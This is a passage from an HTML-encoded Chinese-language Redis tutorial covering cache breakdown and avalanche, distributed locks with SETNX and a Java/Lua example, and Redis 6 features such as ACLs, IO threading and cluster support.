Filter&#xFF0C;&#x5176;&#x5E95;&#x5C42;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x5411;&#x91CF;&#x548C;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x968F;&#x673A;&#x6620;&#x5C04;&#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x8003;&#x8651;&#x5176;&#x547D;&#x4E2D;&#x7387;&#x7684;&#x95EE;&#x9898;&#x3002;&#x6700;&#x540E;&#x8FDB;&#x884C;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#xFF0C;&#x5F53;&#x53D1;&#x73B0;&#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#x6025;&#x5267;&#x964D;&#x4F4E;&#xFF0C;&#x9700;&#x6392;&#x67E5;&#x8BBF;&#x95EE;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x636E;&#xFF0C;&#x548C;&#x8FD0;&#x7EF4;&#x8BBE;&#x7F6E;&#x9ED1;&#x540D;&#x5355;&#x9650;&#x5236;&#x670D;&#x52A1;&#xFF08;&#x6447;&#x4EBA;&#x5E2E;&#x5FD9;&#xFF09;&#x3002;</p>
<h3 id="%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF">&#x7F13;&#x5B58;&#x51FB;&#x7A7F;</h3>
<p>&#x7F13;&#x5B58;&#x51FB;&#x7A7F;&#x7684;&#x73B0;&#x8C61;&#x662F;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#x77AC;&#x65F6;&#x589E;&#x5927;&#xFF0C;&#x7F13;&#x5B58;&#x91CC;&#x4E5F;&#x6CA1;&#x6709;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x7684;&#x952E;&#x8FC7;&#x671F;&#xFF0C;&#x4E14;&#x4F9D;&#x65E7;&#x5904;&#x4E8E;&#x6B63;&#x5E38;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7531;&#x4E8E;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x952E;&#x8FC7;&#x671F;&#xFF0C;&#x540C;&#x65F6;&#x6709;&#x5927;&#x91CF;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x8FC7;&#x6765;&#xFF0C;&#x5728;&#x8FD9;&#x4E9B;&#x8BF7;&#x6C42;&#x53D1;&#x73B0;&#x7F13;&#x5B58;&#x8FC7;&#x671F;&#x65F6;&#x4F1A;&#x5411;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x9001;&#x6D77;&#x91CF;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x9020;&#x6210;&#x7684;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x8FDB;&#x884C;&#x9884;&#x5148;&#x8BBE;&#x7F6E;&#x70ED;&#x95E8;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x5728;&#x9AD8;&#x5CF0;&#x8BBF;&#x95EE;&#x524D;&#xFF0C;&#x5C06;&#x70ED;&#x95E8;&#x6570;&#x636E;&#x63D0;&#x524D;&#x5B58;&#x5165;&#x5230;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x589E;&#x52A0;&#x70ED;&#x95E8;&#x6570;&#x636E;&#x952E;&#x7684;&#x5931;&#x6548;&#x65F6;&#x957F;&#x3002;&#x5176;&#x6B21;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9501;&#xFF0C;&#x5728;&#x7F13;&#x5B58;&#x5931;&#x6548;&#x65F6;&#x5148;&#x5224;&#x65AD;&#x62FF;&#x51FA;&#x6765;&#x7684;&#x503C;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x7A7A;&#x503C;&#x5C31;&#x5E94;&#x8BE5;&#x7ACB;&#x523B;&#x8BBE;&#x7F6E;&#x6392;&#x4ED6;&#x9501;&#xFF0C;&#x5728;&#x6210;&#x529F;&#x8BBE;&#x7F6E;&#x6392;&#x4ED6;&#x9501;&#x540E;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x540C;&#x6B65;&#x7F13;&#x5B58;&#xFF0C;&#x6700;&#x540E;&#x5220;&#x9664;&#x6392;&#x4ED6;&#x9501;&#x3002;&#x4F46;&#x662F;&#x7528;&#x5230;&#x9501;&#xFF0C;&#x90A3;&#x4E48;&#x5FC5;&#x5B9A;&#x6548;&#x7387;&#x964D;&#x4F4E;&#x3002;</p>
<h3 id="%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9">&#x7F13;&#x5B58;&#x96EA;&#x5D29;</h3>
<p>&#x7F13;&#x5B58;&#x96EA;&#x5D29;&#x7684;&#x73B0;&#x8C61;&#x662F;&#x6570;&#x636E;&#x5E93;&#x538B;&#x529B;&#x589E;&#x5927;&#x4EE5;&#x81F3;&#x670D;&#x52A1;&#x5668;&#x5D29;&#x6E83;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7531;&#x4E8E;&#x5728;&#x77ED;&#x6682;&#x65F6;&#x95F4;&#x5185;&#x6709;&#x5927;&#x91CF;&#x952E;&#x7684;&#x96C6;&#x4E2D;&#x8FC7;&#x671F;&#x7684;&#x60C5;&#x51B5;&#x9020;&#x6210;&#x7684;&#x3002;</p>
<p>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x6784;&#x5EFA;&#x591A;&#x7EA7;&#x7F13;&#x5B58;&#x7684;&#x67B6;&#x6784;&#xFF0C;nginx &#x7F13;&#x5B58;&#x3001;redis &#x7F13;&#x5B58;&#x642D;&#x914D;&#x5176;&#x4ED6;&#x7F13;&#x5B58;&#xFF08;ehcache &#x7B49;&#xFF09;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9501;&#x6216;&#x961F;&#x5217;&#x6765;&#x4FDD;&#x8BC1;&#x4E0D;&#x4F1A;&#x6709;&#x5927;&#x91CF;&#x7EBF;&#x7A0B;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x540C;&#x65F6;&#x8BFB;&#x5199;&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x5931;&#x6548;&#x65F6;&#x5927;&#x91CF;&#x7684;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x843D;&#x5230;&#x5E95;&#x5C42;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF0C;&#x4F46;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5E76;&#x4E0D;&#x9002;&#x7528;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x5176;&#x6B21;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x6807;&#x5FD7;&#x66F4;&#x65B0;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x952E;&#x8FC7;&#x671F;&#xFF0C;&#x90A3;&#x4E48;&#x89E6;&#x53D1;&#x901A;&#x77E5;&#x53E6;&#x5916;&#x7684;&#x7EBF;&#x7A0B;&#x5728;&#x540E;&#x53F0;&#x53BB;&#x66F4;&#x65B0;&#x5B9E;&#x9645;&#x952E;&#x7684;&#x7F13;&#x5B58;&#x3002;&#x6700;&#x4F73;&#x505A;&#x6CD5;&#x662F;&#x5C06;&#x7F13;&#x5B58;&#x5931;&#x6548;&#x65F6;&#x95F4;&#x5206;&#x6563;&#xFF0C;&#x5728;&#x539F;&#x6709;&#x7684;&#x5931;&#x6548;&#x65F6;&#x95F4;&#x57FA;&#x7840;&#x4E0A;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x503C;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x7684;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x91CD;&#x590D;&#x7387;&#x5C31;&#x4F1A;&#x964D;&#x4F4E;&#x3002;</p>
<p>&#x7F13;&#x5B58;&#x96EA;&#x5D29;&#x4E0E;&#x7F13;&#x5B58;&#x51FB;&#x7A7F;&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x524D;&#x8005;&#x662F;&#x9488;&#x5BF9;&#x5F88;&#x591A;&#x952E;&#x7684;&#x7F13;&#x5B58;&#x96C6;&#x4F53;&#x5931;&#x6548;&#xFF0C;&#x540E;&#x8005;&#x5219;&#x662F;&#x67D0;&#x4E00;&#x4E2A;&#x952E;&#x7A81;&#x7136;&#x88AB;&#x6D77;&#x91CF;&#x8BF7;&#x6C42;&#x3002;</p>
<h3 id="%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81">&#x5206;&#x5E03;&#x5F0F;&#x9501;</h3>
<p>&#x5355;&#x673A;&#x90E8;&#x7F72;&#x7684;&#x7CFB;&#x7EDF;&#x88AB;&#x6F14;&#x5316;&#x6210;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x67B6;&#x6784;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x4E0E;&#x591A;&#x8FDB;&#x7A0B;&#x5206;&#x5E03;&#x5728;&#x4E0D;&#x540C;&#x673A;&#x5668;&#xFF0C;&#x539F;&#x5355;&#x673A;&#x90E8;&#x7F72;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x5E76;&#x53D1;&#x63A7;&#x5236;&#x9501;&#x7B56;&#x7565;&#x5931;&#x6548;&#xFF0C;&#x5355;&#x7EAF;&#x7684; Java API &#x5E76;&#x4E0D;&#x80FD;&#x63D0;&#x4F9B;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x7684;&#x80FD;&#x529B;&#x3002;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x8FDB;&#x884C;&#x8DE8; JVM &#x7684;&#x4E92;&#x65A5;&#x673A;&#x5236;&#x63A7;&#x5236;&#x5171;&#x4EAB;&#x8D44;&#x6E90;&#x7684;&#x8BBF;&#x95EE;&#x3002;</p>
<p>&#x6570;&#x636E;&#x5E93;&#x3001;redis &#x548C; Zookeeper &#x90FD;&#x80FD;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x3002;&#x53EF;&#x9760;&#x6027; zookeeper &#x6700;&#x9AD8;&#xFF0C;&#x6027;&#x80FD;&#x4E0A; redis &#x6700;&#x4F73;&#x3002;</p>
<pre><code class="language-shell"># &#x8BBE;&#x7F6E;&#x9501; =&gt; setnx
xxx.xx.xx.xxx:6389&gt; setnx users 10
-&gt; Redirected to slot [14124] located at xxx.xx.xx.xxx:6381
(integer) 1
xxx.xx.xx.xxx:6381&gt; setnx users 11
(integer) 0
# &#x91CA;&#x653E;&#x9501; =&gt; setnx
xxx.xx.xx.xxx:6381&gt; del users
(integer) 1
# &#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x9501;
xxx.xx.xx.xxx:6381&gt; setnx users 10
(integer) 1
xxx.xx.xx.xxx:6381&gt; expire users 10
(integer) 1
xxx.xx.xx.xxx:6381&gt; ttl users
(integer) 5
# &#x4E0A;&#x9501;&#x65F6;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4; =&gt; &#x907F;&#x514D;&#x4E0A;&#x9501;&#x540E;&#x5F02;&#x5E38;&#x65E0;&#x6CD5;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
xxx.xx.xx.xxx:6381&gt; set users nx ex 10
OK
</code></pre>
<ul>
<li>UUID &#x9632;&#x8BEF;&#x5220;&#x4EE5;&#x53CA;&#x5220;&#x9664;&#x539F;&#x5B50;&#x6027;&#x6574;&#x5408;</li>
</ul>
<p>&#x539F;&#x5B50;&#x6027;&#x573A;&#x666F;&#x662F;&#x5F53;&#x1F469;&#x1F3FB;&#x200D;&#x1F4BB;&#x5728;&#x4E0A;&#x9501;&#x540E;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x4E8E;&#x91CA;&#x653E;&#x9501;&#x9636;&#x6BB5;&#x51C6;&#x5907;&#x5220;&#x9664;&#x65F6;&#xFF0C;&#x9501;&#x5230;&#x4E86;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x88AB;&#x81EA;&#x52A8;&#x91CA;&#x653E;&#xFF0C;&#x6B64;&#x65F6;&#x1F9D1;&#x1F3FB;&#x200D;&#x1F4BB;&#x83B7;&#x53D6;&#x4E86;&#x9501;&#x5E76;&#x8FDB;&#x884C;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x1F469;&#x1F3FB;&#x200D;&#x1F4BB;&#x8FDB;&#x884C;&#x7684;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x4F1A;&#x5C06;&#x1F9D1;&#x1F3FB;&#x200D;&#x1F4BB;&#x7684;&#x9501;&#x5220;&#x9664;&#x3002;</p>
<blockquote>
<p>=&gt; &#x4E3A;&#x786E;&#x4FDD;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x53EF;&#x7528;&#xFF0C;&#x81F3;&#x5C11;&#x8981;&#x786E;&#x4FDD;&#x9501;&#x7684;&#x5B9E;&#x73B0;&#x540C;&#x65F6;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x6761;&#x4EF6;</p>
<ul>
<li>&#x4E92;&#x65A5;&#x6027;&#x3002;&#x5728;&#x4EFB;&#x610F;&#x65F6;&#x523B;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x6301;&#x6709;&#x9501;&#x3002;</li>
<li>&#x53BB;&#x6B7B;&#x9501;&#x3002;&#x5373;&#x4F7F;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x6301;&#x6709;&#x9501;&#x7684;&#x671F;&#x95F4;&#x5D29;&#x6E83;&#x800C;&#x672A;&#x4E3B;&#x52A8;&#x89E3;&#x9501;&#xFF0C;&#x4E5F;&#x8981;&#x4FDD;&#x8BC1;&#x540E;&#x7EED;&#x5176;&#x4ED6;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x52A0;&#x9501;&#x3002;</li>
<li>&#x52A0;&#x9501;&#x548C;&#x89E3;&#x9501;&#x5FC5;&#x662F;&#x540C;&#x4E00;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x80FD;&#x628A;&#x5176;&#x4ED6;&#x5BA2;&#x6237;&#x7AEF;&#x52A0;&#x7684;&#x9501;&#x7ED9;&#x89E3;&#x9664;&#x3002;</li>
<li>&#x52A0;&#x9501;&#x548C;&#x89E3;&#x9501;&#x5FC5;&#x987B;&#x5177;&#x6709;&#x539F;&#x5B50;&#x6027;&#x3002;</li>
</ul>
</blockquote>
<pre><code class="language-java">@ResetController
@RequestMapping(&quot;/redisTest&quot;)
public class RedisTestController{
    @Autowired
    private RedisTemplate redisTemplate;
    @GetMapping(&quot;testLock&quot;)
    public void testLock(){
        String uuid = UUID.randomUUID().toString();
        // &#x4E0A;&#x9501;
        Boolean lock = redisTemplate.opsForValue().setIfAbsent(&quot;lock&quot;, uuid, 3, TimeUnit.SECONDS);
        // &#x83B7;&#x53D6;&#x9501;&#x3001;&#x67E5;&#x8BE2;&#x503C;
        if(lock){
            Object value = redisTemplate.opsForValue().get(&quot;num&quot;);
            // &#x5224;&#x65AD; num
            if(StringUtils.isEmpty(value)){
                return;
            }
            // &#x6709;&#x503C;&#x5C31;&#x8F6C;&#x6210; int
            int num = Integer.parseInt(value+&quot;&quot;);
            // &#x628A; num &#x52A0; 1
            redisTemplate.opsForValue().set(&quot;num&quot;, ++num);
            // &#x91CA;&#x653E;&#x9501; =&gt; &#x6BD4;&#x8F83; UUID
            String lockTestUUID = (String)redisTemplate.opsForValue().get(&quot;lock&quot;);
            if(lockTestUUID.equals(uuid)){
                redisTemplate.delete(&quot;lock&quot;);
            }
        }else{
            // &#x83B7;&#x53D6;&#x9501;&#x5931;&#x8D25;
            try {
                // &#x6BCF;&#x9694; 0.1 &#x79D2;&#x518D;&#x83B7;&#x53D6;
                Thread.sleep(100);
                testLock();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    @GetMapping(&quot;testLockLua&quot;)
    public void testLockLua() {
        // &#x58F0;&#x660E; uuid &#x505A;&#x4E3A;&#x4E00;&#x4E2A; value &#x653E;&#x5165; key &#x6240;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x4E2D;
        String uuid = UUID.randomUUID().toString();
        // &#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x9501; =&gt; lua &#x811A;&#x672C;&#x4F7F;&#x7528;&#x540C;&#x4E00;&#x628A;&#x9501;&#x6765;&#x5B9E;&#x73B0;&#x5220;&#x9664;
        String objId = &quot;10&quot;; // &#x8BBF;&#x95EE; objId &#x4E3A; 10 &#x53F7;&#x7684;&#x7269;&#x54C1; 100008348542
        String locKey = &quot;lock:&quot; + objId; // &#x9501;&#x4F4F;&#x7684;&#x662F;&#x6BCF;&#x4E2A;&#x5546;&#x54C1;&#x7684;&#x6570;&#x636E;
        // &#x83B7;&#x53D6;&#x9501;
        Boolean lock = redisTemplate.opsForValue().setIfAbsent(locKey, uuid, 3, TimeUnit.SECONDS);
        // &#x7B2C;&#x4E00;&#x79CD; =&gt; lock &#x4E0E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x4E2D;&#x95F4;&#x4E0D;&#x5199;&#x4EFB;&#x4F55;&#x7684;&#x4EE3;&#x7801;
        // redisTemplate.expire(&quot;lock&quot;,10, TimeUnit.SECONDS); // &#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
        if (lock) { // true
            // &#x6267;&#x884C;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x5F00;&#x59CB;
            // &#x83B7;&#x53D6;&#x7F13;&#x5B58;&#x4E2D;&#x7684; num &#x6570;&#x636E;
            Object value = redisTemplate.opsForValue().get(&quot;num&quot;);
            // &#x662F;&#x7A7A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;
            if (StringUtils.isEmpty(value)) {
                return;
            }
            // &#x4E0D;&#x662F;&#x7A7A; =&gt; &#x51FA;&#x73B0;&#x4E86;&#x5F02;&#x5E38;&#x90A3;&#x4E48; delete &#x5931;&#x8D25; -&gt; &#x9501;&#x6C38;&#x5B58;
            int num = Integer.parseInt(value + &quot;&quot;);
            // &#x4F7F; num &#x6BCF;&#x6B21; +1 &#x653E;&#x5165;&#x7F13;&#x5B58;
            redisTemplate.opsForValue().set(&quot;num&quot;, String.valueOf(++num));
            /* &#x4F7F;&#x7528; lua &#x811A;&#x672C;&#x6765;&#x9501; */
            // &#x5B9A;&#x4E49;lua &#x811A;&#x672C;
            String script = &quot;if redis.call(&apos;get&apos;, KEYS[1]) == ARGV[1] then return redis.call(&apos;del&apos;, KEYS[1]) else return 0 end&quot;;
            // &#x4F7F;&#x7528; redis &#x6267;&#x884C; lua &#x6267;&#x884C;
            DefaultRedisScript&lt;Long&gt; redisScript = new DefaultRedisScript&lt;&gt;();
            redisScript.setScriptText(script);
            // &#x8BBE;&#x7F6E;&#x4E00;&#x4E0B;&#x8FD4;&#x56DE;&#x503C;&#x7C7B;&#x578B;&#x4E3A; Long
            // &#x5220;&#x9664;&#x5224;&#x65AD;&#x7684;&#x65F6;&#x8FD4;&#x56DE;&#x7684; 0 =&gt; &#x7ED9;&#x5176;&#x5C01;&#x88C5;&#x4E3A;&#x6570;&#x636E;&#x7C7B;&#x578B; -&gt; &#x4E0D;&#x5C01;&#x88C5;&#x9ED8;&#x8BA4;&#x8FD4;&#x56DE; String
            // &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x4E0E; 0 &#x4F1A;&#x6709;&#x9519;&#x8BEF;&#x53D1;&#x751F;
            redisScript.setResultType(Long.class);
            // script &#x811A;&#x672C;&#x3001;&#x5224;&#x65AD;&#x7684;key&#x3001;key &#x6240;&#x5BF9;&#x5E94;&#x7684;&#x503C;
            redisTemplate.execute(redisScript, Arrays.asList(locKey), uuid);
        } else { // &#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;
            try {
                Thread.sleep(1000); // &#x7761;&#x7720;
                testLockLua(); // &#x7761;&#x9192;&#x8C03;&#x7528;&#x65B9;&#x6CD5;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%96%B0%E7%89%B9%E6%80%A7">&#x65B0;&#x7279;&#x6027;</h2>
<h3 id="acl-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8"><a href="https://redis.io/docs/manual/security/acl/">ACL &#x8BBF;&#x95EE;&#x63A7;&#x5236;&#x5217;&#x8868;</a></h3>
<p>Access Control List &#x5728;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x548C;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x952E;&#x65B9;&#x9762;&#x5BF9;&#x67D0;&#x4E9B;&#x8FDE;&#x63A5;&#x8FDB;&#x884C;&#x9650;&#x5236;&#x3002;</p>
<pre><code class="language-shell"># &#x5C55;&#x793A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x4E0E;&#x64CD;&#x4F5C;&#x6743;&#x9650;
xxx.xx.xx.xxx:6381&gt; acl list
# &#x5177;&#x4F53;&#x7684;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;
xxx.xx.xx.xxx:6381&gt; acl cat
# &#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7528;&#x6237;
xxx.xx.xx.xxx:6381&gt; acl whoami
</code></pre>
<table>
<thead>
<tr>
<th>&#x7C7B;&#x578B;</th>
<th>&#x53C2;&#x6570;</th>
<th>&#x8BF4;&#x660E;</th>
</tr>
</thead>
<tbody>
<tr>
<td>&#x542F;&#x52A8;&#x548C;&#x7981;&#x7528;&#x7528;&#x6237;</td>
<td>on|off</td>
<td>&#x6FC0;&#x6D3B;|&#x7981;&#x7528;&#x67D0;&#x7528;&#x6237;&#x8D26;&#x53F7;</td>
</tr>
<tr>
<td>&#x6743;&#x9650;&#x7684;&#x6DFB;&#x52A0;&#x5220;&#x9664;</td>
<td>+|-&lt;command&gt; +@|-@&lt;category&gt; allcommands|nocommands</td>
<td>&#x5C06;&#x6307;&#x4EE4;&#x6DFB;&#x52A0;&#x5230;&#x7528;&#x6237;&#x53EF;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x5217;&#x8868;&#xFF1B;&#x4ECE;&#x7528;&#x6237;&#x53EF;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x5217;&#x8868;&#x79FB;&#x9664;&#x6307;&#x4EE4; &#x6DFB;&#x52A0;&#x8BE5;&#x7C7B;&#x522B;&#x4E2D;&#x7528;&#x6237;&#x8981;&#x8C03;&#x7528;&#x7684;&#x6240;&#x6709;&#x6307;&#x4EE4;&#xFF1B;&#x6709;&#x6548;&#x7C7B;&#x522B;&#x4E3A; @admin&#x3001;@set&#x3001;@sortedset&#x2026;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x7528; ACL CAT &#x67E5;&#x770B;&#x5B8C;&#x6574;&#x5217;&#x8868;&#x3002;&#x7279;&#x6B8A;&#x7684; @all &#x8868;&#x793A;&#x6240;&#x6709;&#x547D;&#x4EE4;&#xFF0C;&#x5305;&#x62EC;&#x5F53;&#x524D;&#x5B58;&#x5728;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x53CA;&#x5C06;&#x6765;&#x5C06;&#x901A;&#x8FC7;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x7684;&#x547D;&#x4EE4;|&#x4ECE;&#x7528;&#x6237;&#x53EF;&#x8C03;&#x7528;&#x6307;&#x4EE4;&#x4E2D;&#x79FB;&#x9664;&#x7C7B;&#x522B; +@all&#x7684;&#x522B;&#x540D;|-@all&#x7684;&#x522B;&#x540D;</td>
</tr>
<tr>
<td>&#x53EF;&#x64CD;&#x4F5C;&#x952E;&#x7684;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;</td>
<td>~&lt;pattern&gt;</td>
<td>&#x6DFB;&#x52A0;&#x53EF;&#x4F5C;&#x4E3A;&#x7528;&#x6237;&#x53EF;&#x64CD;&#x4F5C;&#x7684;&#x952E;&#x7684;&#x6A21;&#x5F0F; =&gt; ~* &#x8868;&#x793A;&#x5141;&#x8BB8;&#x6240;&#x6709;&#x7684;&#x952E;</td>
</tr>
</tbody>
</table>
<pre><code class="language-shell"># &#x6DFB;&#x52A0;&#x7528;&#x6237;
xxx.xx.xx.xxx:6381&gt; acl setuser test
xxx.xx.xx.xxx:6381&gt; acl list
2) &quot;user test off resetchannels -@all&quot;
# &#x8BBE;&#x7F6E;&#x6709;&#x7528;&#x6237;&#x540D;&#x3001;&#x5BC6;&#x7801;&#x3001;ACL&#x6743;&#x9650;&#x3001;&#x5E76;&#x542F;&#x7528;&#x7684;&#x7528;&#x6237;
xxx.xx.xx.xxx:6381&gt; acl setuser ontest on &gt;password ~cached:* +get
# &#x5207;&#x6362;&#x7528;&#x6237;|&#x9A8C;&#x8BC1;&#x6743;&#x9650;
xxx.xx.xx.xxx:6381&gt; auth ontest password
OK
xxx.xx.xx.xxx:6381&gt; acl whoami
(error) NOPERM this user has no permissions to run the &apos;acl|whoami&apos; command
</code></pre>
<h3 id="io-%E5%A4%9A%E7%BA%BF%E7%A8%8B">IO &#x591A;&#x7EBF;&#x7A0B;</h3>
<p>Redis6 &#x652F;&#x6301;&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x5176;&#x5B9E;&#x6307;&#x5904;&#x7406;&#x7F51;&#x7EDC;&#x6570;&#x636E;&#x7684;&#x8BFB;&#x5199;&#x548C;&#x534F;&#x8BAE;&#x89E3;&#x6790;&#x4E3A;&#x591A;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x975E;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x591A;&#x7EBF;&#x7A0B;&#x3002;Redis6 &#x5BF9;&#x4E8E;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x4F9D;&#x7136;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x3002;&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#x4F9D;&#x65E7;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x4E0E;&#x591A;&#x8DEF; IO &#x590D;&#x7528;&#x3002;</p>
<h3 id="%E6%94%AF%E6%8C%81-cluster">&#x652F;&#x6301; Cluster</h3>
<p>&#x8001;&#x7248; Redis &#x60F3;&#x8981;&#x642D;&#x96C6;&#x7FA4;&#x9700;&#x5355;&#x72EC;&#x5B89;&#x88C5; ruby &#x73AF;&#x5883;&#xFF0C;redis5 &#x5C06; redis-trib.rb &#x7684;&#x529F;&#x80FD;&#x96C6;&#x6210;&#x5230; redis-cli&#x3002;&#x6B64;&#x5916;&#x5B98;&#x65B9; redis-benchmark &#x5DE5;&#x5177;&#x4E5F;&#x652F;&#x6301; cluster &#x6A21;&#x5F0F;&#xFF0C;&#x901A;&#x8FC7;&#x591A;&#x7EBF;&#x7A0B;&#x7684;&#x65B9;&#x5F0F;&#x5BF9;&#x591A;&#x4E2A;&#x5206;&#x7247;&#x8FDB;&#x884C;&#x538B;&#x6D4B;&#x3002;</p>
<h3 id="%E5%85%B6%E4%BB%96%E6%9B%B4%E6%96%B0">&#x5176;&#x4ED6;&#x66F4;&#x65B0;</h3>
<ul>
<li>&#x65B0;&#x7684; Redis &#x901A;&#x4FE1;&#x534F;&#x8BAE; RESP3 &#x7528;&#x4E8E;&#x4F18;&#x5316;&#x670D;&#x52A1;&#x7AEF;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x901A;&#x4FE1;</li>
<li>Client side caching &#x5BA2;&#x6237;&#x7AEF;&#x7F13;&#x5B58;&#xFF08;&#x57FA;&#x4E8E; RESP3 &#x534F;&#x8BAE;&#x5B9E;&#x73B0;&#xFF09;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x5347;&#x7F13;&#x5B58;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5C06;&#x5BA2;&#x6237;&#x7AEF;&#x7ECF;&#x5E38;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x636E; cache &#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x51CF;&#x5C11; TCP &#x7F51;&#x7EDC;&#x4EA4;&#x4E92;</li>
